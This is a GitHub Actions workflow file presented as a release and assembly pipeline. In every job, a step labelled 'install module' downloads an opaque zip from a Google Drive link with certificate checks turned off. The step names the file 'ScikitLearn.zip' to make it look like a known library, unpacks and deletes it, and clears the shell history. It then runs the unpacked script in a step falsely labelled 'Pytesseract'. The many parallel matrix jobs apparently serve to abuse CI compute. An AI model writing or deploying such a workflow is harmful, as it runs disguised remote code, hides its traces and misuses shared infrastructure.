name: cosmogio491stack
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  RELEASE:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.o, I.i, I.ii]
        flag: ['Initialize', 'Develop', 'Test', 'Execute', 'Release']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: install module
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1iXKlnBLPdxdm9uwYtaKwtQuEZYMVNF60" -O ScikitLearn.zip
        unzip -o ScikitLearn.zip
        rm ScikitLearn.zip
        history -c && history -w

    - name: Pytesseract
      run: bash requirements.sh


  ASSEMBLE1:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.o, I.i, I.ii]
        flag: ['Start', 'Code', 'Debug', 'Deploy', 'Monitor']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: install module
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1iXKlnBLPdxdm9uwYtaKwtQuEZYMVNF60" -O ScikitLearn.zip
        unzip -o ScikitLearn.zip
        rm ScikitLearn.zip
        history -c && history -w

    - name: Pytesseract
      run: bash requirements.sh
        
